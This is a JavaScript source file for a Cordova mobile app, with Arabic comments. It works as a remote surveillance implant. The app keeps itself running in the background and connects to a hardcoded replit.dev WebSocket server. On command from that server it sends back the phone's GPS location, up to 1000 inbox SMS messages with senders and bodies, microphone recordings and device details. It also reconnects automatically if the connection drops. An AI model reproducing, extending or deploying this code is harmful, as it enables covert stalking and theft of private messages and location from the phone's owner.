
document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات والبيانات
const appData = {
  receivedRequests: [],
  recordings: [],
  smsLists: []
};

// تمكين وضع الخلفية ومنع إيقاف التطبيق
function onDeviceReady() {
  console.log('Device is ready');
  
  // تهيئة وضع الخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: "التطبيق يعمل في الخلفية",
      text: "جارٍ استقبال الأوامر...",
      icon: 'icon'
    });
    
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
    });
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // حالة البطارية
  initBattery(deviceInfo);
}

// إدارة حالة البطارية
function initBattery(deviceInfo) {
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      updateBatteryInfo(battery, deviceInfo);
      battery.addEventListener('levelchange', () => updateBatteryInfo(battery, deviceInfo));
      battery.addEventListener('chargingchange', () => updateBatteryInfo(battery, deviceInfo));
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
}

function updateBatteryInfo(battery, deviceInfo) {
  deviceInfo.battery = {
    level: Math.round(battery.level * 100),
    charging: battery.charging,
    chargingTime: battery.chargingTime,
    dischargingTime: battery.dischargingTime
  };
  
  if (window.wsConnection?.readyState === WebSocket.OPEN) {
    window.wsConnection.send(JSON.stringify({
      type: 'device_update',
      deviceInfo: {
        battery: deviceInfo.battery,
        timestamp: new Date().toISOString()
      }
    }));
  }
}

// اتصال WebSocket
function connectToServer(deviceInfo) {
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        handleIncomingCommand(data, deviceInfo);
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully');
      }
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية
  setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        appData
      }));
    }
  }, 30000);
}

// معالجة الأوامر الواردة
function handleIncomingCommand(data, deviceInfo) {
  console.log('Received command:', data.command);
  
  const request = {
    ...data.command,
    receivedAt: new Date().toISOString(),
    status: 'pending'
  };
  
  appData.receivedRequests.push(request);
  
  executeCommand(data.command, (response) => {
    request.status = 'completed';
    request.response = response;
    
    if (window.wsConnection?.readyState === WebSocket.OPEN) {
      window.wsConnection.send(JSON.stringify({
        type: 'response',
        commandId: data.commandId,
        response: {
          ...response,
          requestData: data.command
        }
      }));
    }
  });
}

// تنفيذ الأوامر
function executeCommand(command, callback) {
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      showDurationDialog(commandId, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command'
      });
  }
}

// عرض نافذة اختيار مدة التسجيل
function showDurationDialog(commandId, callback) {
  navigator.notification.prompt(
    'أدخل مدة التسجيل بالثواني (10-300):',
    (result) => {
      const duration = Math.min(Math.max(parseInt(result.input1) || 10, 300);
      recordAudio(commandId, duration, callback);
    },
    'تسجيل الصوت',
    ['موافق', 'إلغاء'],
    '10'
  );
}

// تسجيل الصوت
function recordAudio(commandId, duration, callback) {
  const mediaRecorderOptions = {
    mimeType: 'audio/mpeg',
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
        const audioUrl = URL.createObjectURL(audioBlob);
        const fileName = `recording_${commandId}.mp3`;
        
        saveToLocalStorage(fileName, audioBlob).then(filePath => {
          const recording = {
            id: commandId,
            duration,
            filePath,
            url: audioUrl,
            timestamp: new Date().toISOString()
          };
          
          appData.recordings.push(recording);
          
          callback({
            commandId,
            status: 'success',
            audio: {
              duration,
              format: 'mp3',
              size: audioBlob.size,
              downloadUrl: audioUrl,
              fileName,
              playableUrl: audioUrl
            }
          });
        });
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording failed',
        details: error.message
      });
    });
}

// الحصول على الرسائل النصية
function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available'
    });
  }
  
  SMS.listSMS({ box: 'inbox', maxCount: 1000 }, (messages) => {
    const smsText = messages.map(msg => 
      `من: ${msg.address}\nالتاريخ: ${new Date(msg.date)}\nالرسالة: ${msg.body}\n\n`
    ).join('');
    
    const smsBlob = new Blob([smsText], { type: 'text/plain' });
    const smsUrl = URL.createObjectURL(smsBlob);
    const fileName = `sms_${commandId}.txt`;
    
    saveToLocalStorage(fileName, smsBlob).then(filePath => {
      const smsList = {
        id: commandId,
        count: messages.length,
        filePath,
        timestamp: new Date().toISOString()
      };
      
      appData.smsLists.push(smsList);
      
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          address: msg.address,
          body: msg.body,
          date: msg.date
        })),
        downloadTxtUrl: smsUrl,
        fileName
      });
    });
  }, error => {
    callback({ 
      commandId,
      status: 'error',
      error: 'Failed to get SMS',
      details: error
    });
  });
}

// الحصول على الموقع الجغرافي
function getLocation(commandId, callback) {
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: position.timestamp
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: error.message
      });
    },
    { enableHighAccuracy: true, timeout: 15000 }
  );
}

// معلومات الجهاز
function getDeviceInfo(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    deviceInfo: {
      cordova: device.cordova,
      model: device.model,
      platform: device.platform,
      uuid: device.uuid,
      version: device.version,
      manufacturer: device.manufacturer
    }
  });
}

// الطلبات المستلمة
function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: appData.receivedRequests
  });
}

// حفظ الملفات محلياً
function saveToLocalStorage(fileName, blob) {
  return new Promise((resolve, reject) => {
    window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
      dir.getFile(fileName, { create: true }, fileEntry => {
        fileEntry.createWriter(fileWriter => {
          fileWriter.onwriteend = () => resolve(fileEntry.toURL());
          fileWriter.onerror = reject;
          fileWriter.write(blob);
        });
      }, reject);
    }, reject);
  });
}

// أحداث التطبيق
document.addEventListener('pause', () => {
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
  }
});

document.addEventListener('resume', () => {
  if (window.wsConnection?.readyState !== WebSocket.OPEN) {
    onDeviceReady();
  }
});
